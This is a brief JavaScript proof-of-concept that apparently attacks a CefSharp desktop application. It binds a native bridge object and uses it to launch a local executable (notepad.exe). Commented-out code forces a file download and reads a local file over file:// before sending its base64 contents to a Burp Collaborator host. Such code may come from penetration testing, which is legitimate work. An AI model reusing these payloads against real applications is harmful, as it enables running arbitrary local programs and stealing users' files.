


        window.CefSharp.BindObjectAsync("as2NativeClient")
        .then((result) => {
          if(window.as2NativeClient) {
            console.log("NC Object bound");
                  
            
            window.as2NativeClient.redirectToHomeWithUrl("C:\\Windows\\System32\\notepad.exe");
           // window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
                  
          }
        })
      







  /* ignore below lines
  
d=document.createElement("a")
d.href=window.URL.createObjectURL(new Blob(['blaaaaat'], {type: 'text/plain'}))
d.setAttribute("download","1337.txt")
d.click()


*/
  /*var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //var xhttp1 = new XMLHttpRequest();
      (new Image()).src= "https://e8n5wqznm2fytph1etkluhtcw32vqk.burpcollaborator.net?"+btoa(this.responseText)
      ///xhttp1.send()

    }
  };
  xhttp.open("GET", "file:///C:/Users/desktop.ini", true);
  xhttp.send()
*/

//alert()




